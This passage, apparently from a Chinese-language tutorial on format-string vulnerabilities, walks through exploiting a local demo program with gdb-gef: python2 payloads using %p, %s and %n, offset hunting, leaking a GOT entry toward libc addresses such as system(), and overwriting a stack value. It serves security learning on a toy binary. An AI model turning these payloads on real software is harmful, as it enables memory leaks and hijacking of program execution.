0x00007fffffffe060 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdec8│+0x0000: 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa ← $rsp0x00007fffffffded0│+0x0008: 0x42410000000000000x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)0x00007fffffffdee0│+0x0018: 0x00007fffffffded6 → &quot;ABCDEFGH&quot; ← $rdi0x00007fffffffdee8│+0x0020: 0x000000732439252e (&quot;.%9$s&quot;?)0x00007fffffffdef0│+0x0028: 0x00000000000000000x00007fffffffdef8│+0x0030: 0x00000000000000000x00007fffffffdf00│+0x0038: 0x0000000000000000─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e17c81 &lt;fprintf+177&gt; ret 0x7ffff7e17c82 &lt;fprintf+178&gt; call 0x7ffff7ee5a70 &lt;__stack_chk_fail&gt; 0x7ffff7e17c87 nop WORD PTR [rax+rax*1+0x0] → 0x7ffff7e17c90 &lt;printf+0&gt; endbr64 0x7ffff7e17c94 &lt;printf+4&gt; sub rsp, 0xd8 0x7ffff7e17c9b &lt;printf+11&gt; mov r10, rdi 0x7ffff7e17c9e &lt;printf+14&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7e17ca3 &lt;printf+19&gt; mov QWORD PTR [rsp+0x30], rdx 0x7ffff7e17ca8 &lt;printf+24&gt; mov QWORD PTR [rsp+0x38], rcx─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e17c90 → printf()[#1] 0x4011f6 → main()────────────────────────────────────────────────────────────────────────────────gef➤ x/20g $rsp0x7fffffffdec8: 0x4011f6 0x42410000000000000x7fffffffded8: 0x484746454443 0x7fffffffded60x7fffffffdee8: 0x732439252e 0x00x7fffffffdef8: 0x0 0x00x7fffffffdf08: 0x0 0x4000400x7fffffffdf18: 0xf0b5ff 0xc20x7fffffffdf28: 0x7fffffffdf57 0x7fffffffdf560x7fffffffdf38: 0x40125d 0x7ffff7fa72e80x7fffffffdf48: 0x401210 0x00x7fffffffdf58: 0x401090 0xffffffffffffe060gef➤ x/s 0x00007fffffffded60x7fffffffded6: &quot;ABCDEFGH&quot;gef➤ cContinuing.�����[Inferior 1 (process 21612) exited with code 012]gef➤ 我们看到这里有点问题，本来应该在最后输出.ABCDEFGH字符串的，但是并没有输出。推测是由于最前面的00导致了字符串截断（实验结果说明如下） 123456789101112131415161718192021sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\\xd8\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&quot;+&quot;.%9$p&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ ./fmtdemo &lt; text�����sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\\xd8\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&quot;+&quot;.%9$x&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ ./fmtdemo &lt; text�����sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\\xd8\\xde\\xff\\xff\\xff\\x7f&quot;+&quot;.%9$x&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ ./fmtdemo &lt; text�����.782439sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\\xd8\\xde\\xff\\xff\\xff\\x7f&quot;+&quot;.%9$p&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ ./fmtdemo &lt; text�����.0x702439sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\\xd8\\xde\\xff\\xff\\xff\\x7f&quot;+&quot;.%9$s&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ ./fmtdemo &lt; text段错误 (核心已转储)sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\\xd8\\xde\\xff\\xff\\xff\\x7f&quot;+&quot;.%p&quot;*20)&#x27; &gt; textsakura@Kylin:~/文档/print$ ./fmtdemo &lt; text�����.0x1.0x88888888.0xffffffff.0x7fffffffdf36.0x7c.0x4241000000000000.0x484746454443.0x252e7fffffffded8.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x7025.0x7fffffffdfb7.0x7fffffffdfb6.0x40125d.0x7ffff7fa72e8sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;\\xd8\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&quot;+&quot;.%p&quot;*20)&#x27; &gt; textsakura@Kylin:~/文档/print$ ./fmtdemo &lt; text����� 通过前几次测试，我们发现当地址有\\x00时，无论如何变化格式符，结果都一样，这时我就有点怀疑是发生了截断。去掉\\x00后再测试，这时就输出了结果，果然是发生了截断。但是这个地址必须要有\\x00，该怎么办呢？我看到了下面这篇文章，找到了解决办法 — 把地址放到最后，然后通过测试找出偏移。 参考资料：64位格式化字符串漏洞修改got表利用详解 123456sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*9+&quot;.%10$p.&quot;+&quot;\\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ ./fmtdemo &lt; textAAAAAAAAA.0x7fffffffded6.�����sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*9+&quot;.%10$s.&quot;+&quot;\\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ ./fmtdemo &lt; textAAAAAAAAA..����� 这时，我们找到了偏移地址为10，不过我们仍然无法输出字符串，这是怎么回事呢？gdb调试一下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162sakura@Kylin:~/文档/print$ gdb-gef fmtdemoReading symbols from fmtdemo...GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure88 commands loaded and 5 functions added for GDB 9.1 in 0.01ms using Python engine 3.8gef➤ b printfBreakpoint 1 at 0x401070gef➤ r &lt; textStarting program: /home/sakura/文档/print/fmtdemo &lt; textBreakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000000000401210 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0xffffffff $rdx : 0x88888888 $rsp : 0x00007fffffffdec8 → 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa$rbp : 0x00007fffffffdf70 → 0x0000000000000000$rsi : 0x1 $rdi : 0x00007fffffffdee0 → 0x4141414141414141 (&quot;AAAAAAAA&quot;?)$rip : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r8 : 0x00007fffffffded6 → &quot;ABCDEFGH&quot;$r9 : 0x7c $r10 : 0x00007ffff7fef8c0 → pxor xmm0, xmm0$r11 : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r12 : 0x0000000000401090 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffe060 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdec8│+0x0000: 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa ← $rsp0x00007fffffffded0│+0x0008: 0x42410000000000000x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)0x00007fffffffdee0│+0x0018: 0x4141414141414141 ← $rdi0x00007fffffffdee8│+0x0020: 0x2e73243031252e410x00007fffffffdef0│+0x0028: 0x00007fffffffded6 → &quot;ABCDEFGH&quot;0x00007fffffffdef8│+0x0030: 0x00000000000000000x00007fffffffdf00│+0x0038: 0x0000000000000000─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e17c81 &lt;fprintf+177&gt; ret 0x7ffff7e17c82 &lt;fprintf+178&gt; call 0x7ffff7ee5a70 &lt;__stack_chk_fail&gt; 0x7ffff7e17c87 nop WORD PTR [rax+rax*1+0x0] → 0x7ffff7e17c90 &lt;printf+0&gt; endbr64 0x7ffff7e17c94 &lt;printf+4&gt; sub rsp, 0xd8 0x7ffff7e17c9b &lt;printf+11&gt; mov r10, rdi 0x7ffff7e17c9e &lt;printf+14&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7e17ca3 &lt;printf+19&gt; mov QWORD PTR [rsp+0x30], rdx 0x7ffff7e17ca8 &lt;printf+24&gt; mov QWORD PTR [rsp+0x38], rcx─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e17c90 → printf()[#1] 0x4011f6 → main()────────────────────────────────────────────────────────────────────────────────gef➤ cContinuing.AAAAAAAAA.ABCDEFGH.�����[Inferior 1 (process 22967) exited with code 012]gef➤ 我们发现，调试出来的程序输出了字符串，我推测是关于调试态和运行态的区别吧，奈何我对于linux上的这一块不熟悉。如有大佬了解原因，恳请您答疑。 当然这也没有什么用，我们真正经常用到的地方是，把程序中某函数的 GOT 地址传进去，然后获得该地址所对应的函数的虚拟地址。然后根据函数在 libc 中的相对位置，计算出我们需要的函数地址（如 system()）。如下面展示的这样： 12345678910111213sakura@Kylin:~/文档/print$ readelf -r fmtdemo重定位节 &#x27;.rela.dyn&#x27; at offset 0x4f0 contains 2 entries: 偏移量 信息 类型 符号值 符号名称 + 加数000000403ff0 000300000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0000000403ff8 000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0重定位节 &#x27;.rela.plt&#x27; at offset 0x520 contains 3 entries: 偏移量 信息 类型 符号值 符号名称 + 加数000000404018 000100000007 R_X86_64_JUMP_SLO 0000000000000000 putchar@GLIBC_2.2.5 + 0000000404020 000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0000000404028 000500000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0sakura@Kylin:~/文档/print$ .rel.plt 中有四个函数可供我们选择，按理说选择任意一个都没有问题，但是在实践中我们会发现一些问题。下面的结果分别是 printf、__libc_start_main、putchar 和 __isoc99_scanf： 1234567891011sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\\x20\\x40\\x40\\x00\\x00\\x00\\x00\\x00&quot;)&#x27; | ./fmtdemoAAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x401200..0x7ffff7fa72e8.sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\\xf0\\x3f\\x40\\x00\\x00\\x00\\x00\\x00&quot;)&#x27; | ./fmtdemoAAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x403ff0..0x7ffff7fa7200.�?@sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\\x18\\x40\\x40\\x00\\x00\\x00\\x00\\x00&quot;)&#x27; | ./fmtdemoAAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x404018..0x7ffff7fa7200.@@sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*8+&quot;.%p.&quot;*20+&quot;\\x28\\x40\\x40\\x00\\x00\\x00\\x00\\x00&quot;)&#x27; | ./fmtdemoAAAAAAAA.0x1..0x88888888..0xffffffff..0x7fffffffdf36..0x7c..0x4241000000000000..0x484746454443..0x4141414141414141..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x2e70252e2e70252e..0x404028..0x7ffff7fa7200.(@@ 细心一点你就会发现第一个（printf）的结果有问题。我们输入了 \\x20\\x40\\x40\\x00\\x00\\x00\\x00\\x00（0x000000404020），可是 21 号位置输出的结果却是 0x401200，那么，\\20 哪去了？ 查了一下 ASCII 表，发现 \\x0C (’\\f’)、\\x07（’\\a’）、\\x08（’\\b’）、\\x20（SPACE）等的不可见字符都会被省略。这就会让我们后续的操作出现问题。所以这里我们选用最后一个（__isoc99_scanf）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*10+&quot;.%10$p&quot;+&quot;\\x28\\x40\\x40\\x00\\x00\\x00\\x00\\x00&quot;)&#x27; | ./fmtdemoAAAAAAAAAA.0x404028(@@sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*10+&quot;.%10$s&quot;+&quot;\\x28\\x40\\x40\\x00\\x00\\x00\\x00\\x00&quot;)&#x27; | ./fmtdemoAAAAAAAAAA.�����(@@sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;A&quot;*10+&quot;.%10$p&quot;+&quot;\\x28\\x40\\x40\\x00\\x00\\x00\\x00\\x00&quot;)&#x27;&gt;textsakura@Kylin:~/文档/print$ gdb-gef fmtdemogef➤ b printfgef➤ r &lt; text[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000000000401210 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0xffffffff $rdx : 0x88888888 $rsp : 0x00007fffffffdec8 → 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa$rbp : 0x00007fffffffdf70 → 0x0000000000000000$rsi : 0x1 $rdi : 0x00007fffffffdee0 → &quot;AAAAAAAAAA.%10$p(@@&quot;$rip : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r8 : 0x00007fffffffded6 → &quot;ABCDEFGH&quot;$r9 : 0x7c $r10 : 0x00007ffff7fef8c0 → pxor xmm0, xmm0$r11 : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r12 : 0x0000000000401090 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffe060 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdec8│+0x0000: 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa ← $rsp0x00007fffffffded0│+0x0008: 0x42410000000000000x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)0x00007fffffffdee0│+0x0018: &quot;AAAAAAAAAA.%10$p(@@&quot; ← $rdi0x00007fffffffdee8│+0x0020: &quot;AA.%10$p(@@&quot;0x00007fffffffdef0│+0x0028: 0x0000000000404028 → 0x00007ffff7e190b0 → &lt;__isoc99_scanf+0&gt; endbr64 0x00007fffffffdef8│+0x0030: 0x00000000000000000x00007fffffffdf00│+0x0038: 0x0000000000000000─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e17c81 &lt;fprintf+177&gt; ret 0x7ffff7e17c82 &lt;fprintf+178&gt; call 0x7ffff7ee5a70 &lt;__stack_chk_fail&gt; 0x7ffff7e17c87 nop WORD PTR [rax+rax*1+0x0] → 0x7ffff7e17c90 &lt;printf+0&gt; endbr64 0x7ffff7e17c94 &lt;printf+4&gt; sub rsp, 0xd8 0x7ffff7e17c9b &lt;printf+11&gt; mov r10, rdi 0x7ffff7e17c9e &lt;printf+14&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7e17ca3 &lt;printf+19&gt; mov QWORD PTR [rsp+0x30], rdx 0x7ffff7e17ca8 &lt;printf+24&gt; mov QWORD PTR [rsp+0x38], rcx─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e17c90 → printf()[#1] 0x4011f6 → main()────────────────────────────────────────────────────────────────────────────────gef➤ x/g 0x00000000004040280x404028 &lt;__isoc99_scanf@got.plt&gt;: 0x7ffff7e190b0gef➤ cContinuing.AAAAAAAAAA.0x404028(@@[Inferior 1 (process 23800) exited with code 012]gef➤ 虽然我们可以通过 x/w 指令得到 __isoc99_scanf 函数的虚拟地址 0x7ffff7e190b0。但是由于 0x0000000000404028 处的内容是仍然一个指针，使用 %10$s 打印并不成功。 2.2.4 栈数据覆盖 现在我们已经可以读取栈上和任意地址的内存了，接下来我们更进一步，通过修改栈和内存来劫持程序的执行流程。%n 转换指示符将 %n 当前已经成功写入流或缓冲区中的字符个数存储到地址由参数指定的整数中。 123456789//coverStack.c#include&lt;stdio.h&gt;void main() &#123; int i; char str[] = &quot;hello&quot;; printf(&quot;%s %n\\n&quot;, str, &amp;i); printf(&quot;%d\\n&quot;, i);&#125; 123sakura@Kylin:~/文档/print$ ./coverStack hello 6 i 被赋值为 6，因为在遇到转换指示符之前一共写入了 6 个字符（hello 加上一个&quot;\\0&quot;）。在没有长度修饰符时，默认写入一个 int 类型的值。 通常情况下，我们要需要覆写的值是一个 shellcode 的地址，而这个地址往往是一个很大的数字。这时我们就需要通过使用具体的宽度或精度的转换规范来控制写入的字符个数，即在格式字符串中加上一个十进制整数来表示输出的最小位数，如果实际位数大于定义的宽度，则按实际位数输出，反之则以空格或 0 补齐（0 补齐时在宽度前加点. 或 0）。如： 123456789101112//coverStack.c#include&lt;stdio.h&gt;void main() &#123; int i; printf(&quot;%10u%n\\n&quot;, 1, &amp;i); printf(&quot;%d\\n&quot;, i); printf(&quot;%.50u%n\\n&quot;, 1, &amp;i); printf(&quot;%d\\n&quot;, i); printf(&quot;%0100u%n\\n&quot;, 1, &amp;i); printf(&quot;%d\\n&quot;, i);&#125; 1234567sakura@Kylin:~/文档/print$ ./coverStack 11000000000000000000000000000000000000000000000000001500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001100 还是我们在 2.2.2 栈数据泄露 中使用的程序，我们尝试将 arg4 的值更改为任意值（比如 0x00000040，十进制 64），在 gdb 中可以看到得到 arg4 的地址 0x00007fffffffded6，那么我们构造格式字符串 %016x%016x%032d%9$n\\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00。 \\1. %016x%016x 表示两个 32 字符宽的十六进制数，占 16 字节。 \\2. %032d 占 32 字节，三个部分加起来就占了 16+16+32=64 字节，即把 arg4 赋值为 0x00000040。 \\3. \\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00 表示 arg4 的地址，由于在 %n 后面所以不被计入。 \\4. 格式字符串最后一部分 %9$n 也是最重要的一部分，由于 \\x00 字符截断的原因，我们需要把 arg4 的地址放在最后。所以它的偏移可能不是 8，还需要我们进一步调试，这里暂且先用偏移 8 来解释。 %9$n 和上面的内容一样，表示格式字符串的第 9 个参数，即写入 \\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00 的地方，printf() 就是通过这个地址找到被覆盖的内容的。 首先，为了确定 arg4 在栈中的偏移，传入参数：%016x.%016x.%022d.%11$p.\\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00 用以区分出地址。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;%016x.%016x.%022d.%11$p.\\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ gdb-gef fmtdemogef➤ b printfgef➤ r &lt; text[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000000000401210 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0xffffffff $rdx : 0x88888888 $rsp : 0x00007fffffffdec8 → 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa$rbp : 0x00007fffffffdf70 → 0x0000000000000000$rsi : 0x1 $rdi : 0x00007fffffffdee0 → 0x30252e7836313025 (&quot;%016x.%0&quot;?)$rip : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r8 : 0x00007fffffffded6 → &quot;ABCDEFGH&quot;$r9 : 0x7c $r10 : 0x00007ffff7fef8c0 → pxor xmm0, xmm0$r11 : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r12 : 0x0000000000401090 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffe060 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdec8│+0x0000: 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa ← $rsp0x00007fffffffded0│+0x0008: 0x42410000000000000x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)0x00007fffffffdee0│+0x0018: 0x30252e7836313025 ← $rdi0x00007fffffffdee8│+0x0020: 0x323230252e7836310x00007fffffffdef0│+0x0028: 0x2e70243131252e640x00007fffffffdef8│+0x0030: 0x00007fffffffded6 → &quot;ABCDEFGH&quot;0x00007fffffffdf00│+0x0038: 0x0000000000000000─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e17c81 &lt;fprintf+177&gt; ret 0x7ffff7e17c82 &lt;fprintf+178&gt; call 0x7ffff7ee5a70 &lt;__stack_chk_fail&gt; 0x7ffff7e17c87 nop WORD PTR [rax+rax*1+0x0] → 0x7ffff7e17c90 &lt;printf+0&gt; endbr64 0x7ffff7e17c94 &lt;printf+4&gt; sub rsp, 0xd8 0x7ffff7e17c9b &lt;printf+11&gt; mov r10, rdi 0x7ffff7e17c9e &lt;printf+14&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7e17ca3 &lt;printf+19&gt; mov QWORD PTR [rsp+0x30], rdx 0x7ffff7e17ca8 &lt;printf+24&gt; mov QWORD PTR [rsp+0x38], rcx─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e17c90 → printf()[#1] 0x4011f6 → main()────────────────────────────────────────────────────────────────────────────────gef➤ cContinuing.0000000000000001.0000000088888888.-000000000000000000001.0x7fffffffded6.�����[Inferior 1 (process 24935) exited with code 012]gef➤ 经过不断调试，最终我们找到了我们写入的参数的位置 偏移：10，接下来就是写入了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;%016x%016x%032d%11$n.\\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ gdb-gef fmtdemoReading symbols from fmtdemo...GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure88 commands loaded and 5 functions added for GDB 9.1 in 0.01ms using Python engine 3.8gef➤ b printfBreakpoint 1 at 0x401070gef➤ r &lt; textStarting program: /home/sakura/文档/print/fmtdemo &lt; text[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000000000401210 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0xffffffff $rdx : 0x88888888 $rsp : 0x00007fffffffdec8 → 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa$rbp : 0x00007fffffffdf70 → 0x0000000000000000$rsi : 0x1 $rdi : 0x00007fffffffdee0 → 0x3130257836313025 (&quot;%016x%01&quot;?)$rip : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r8 : 0x00007fffffffded6 → &quot;ABCDEFGH&quot;$r9 : 0x7c $r10 : 0x00007ffff7fef8c0 → pxor xmm0, xmm0$r11 : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r12 : 0x0000000000401090 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffe060 → 0x0000000000000001$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdec8│+0x0000: 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa ← $rsp0x00007fffffffded0│+0x0008: 0x42410000000000000x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)0x00007fffffffdee0│+0x0018: 0x3130257836313025 ← $rdi0x00007fffffffdee8│+0x0020: 0x25643233302578360x00007fffffffdef0│+0x0028: 0xffded62e6e2431310x00007fffffffdef8│+0x0030: 0x00000000007fffff0x00007fffffffdf00│+0x0038: 0x0000000000000000─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e17c81 &lt;fprintf+177&gt; ret 0x7ffff7e17c82 &lt;fprintf+178&gt; call 0x7ffff7ee5a70 &lt;__stack_chk_fail&gt; 0x7ffff7e17c87 nop WORD PTR [rax+rax*1+0x0] → 0x7ffff7e17c90 &lt;printf+0&gt; endbr64 0x7ffff7e17c94 &lt;printf+4&gt; sub rsp, 0xd8 0x7ffff7e17c9b &lt;printf+11&gt; mov r10, rdi 0x7ffff7e17c9e &lt;printf+14&gt; mov QWORD PTR [rsp+0x28], rsi 0x7ffff7e17ca3 &lt;printf+19&gt; mov QWORD PTR [rsp+0x30], rdx 0x7ffff7e17ca8 &lt;printf+24&gt; mov QWORD PTR [rsp+0x38], rcx─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e17c90 → printf()[#1] 0x4011f6 → main()────────────────────────────────────────────────────────────────────────────────gef➤ 我们发现地址未对齐，调整我们传入的参数，使得地址对齐。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;%016x%016x%032d%11$n....\\xd6\\xde\\xff\\xff\\xff\\x7f\\x00\\x00&quot;)&#x27; &gt; textsakura@Kylin:~/文档/print$ gdb-gef fmtdemoReading symbols from fmtdemo...GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure88 commands loaded and 5 functions added for GDB 9.1 in 0.00ms using Python engine 3.8gef➤ b printfBreakpoint 1 at 0x401070gef➤ r &lt; textStarting program: /home/sakura/文档/print/fmtdemo &lt; text[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000000000401210 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0xffffffff $rdx : 0x88888888 $rsp : 0x00007fffffffdec8 → 0x00000000004011f6 → &lt;main+128&gt; mov edi, 0xa$rbp : 0x00007fffffffdf70 → 0x0000000000000000$rsi : 0x1 $rdi : 0x00007fffffffdee0 → 0x3130257836313025 (&quot;%016x%01&quot;?)$rip : 0x00007ffff7e17c90 → &lt;printf+0&gt; endbr64 $r8 : 0x00007fffffffded6 → 